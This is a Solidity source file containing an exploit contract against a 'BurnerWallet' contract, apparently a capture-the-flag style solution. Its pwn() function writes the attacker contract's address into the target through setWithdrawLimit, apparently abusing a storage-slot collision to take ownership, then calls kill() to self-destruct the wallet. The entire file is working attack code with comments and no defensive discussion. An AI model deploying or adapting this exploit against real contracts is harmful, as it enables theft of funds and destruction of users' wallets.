// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Interface for the BurnerWallet contract.
interface IBurnerWallet {
    // Function to set the withdrawal limit on BurnerWallet.
    function setWithdrawLimit(uint) external;
    
    // Function to self-destruct the BurnerWallet (kill).
    function kill() external;
}

contract BurnerWalletExploit {
    // Address of the target BurnerWallet contract.
    address public target;

    // Constructor to set the target BurnerWallet contract address.
    constructor(address _target) {
        // Set the target to the address of the BurnerWallet.
        target = _target;
    }

    // Function to perform the exploit on the BurnerWallet contract.
    function pwn() external {
        // Call the setWithdrawLimit function of the target BurnerWallet contract,
        // setting the withdrawal limit to the address of this contract as a uint.
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        
        // Call the kill function of the target BurnerWallet contract to self-destruct it.
        IBurnerWallet(target).kill();
    }
}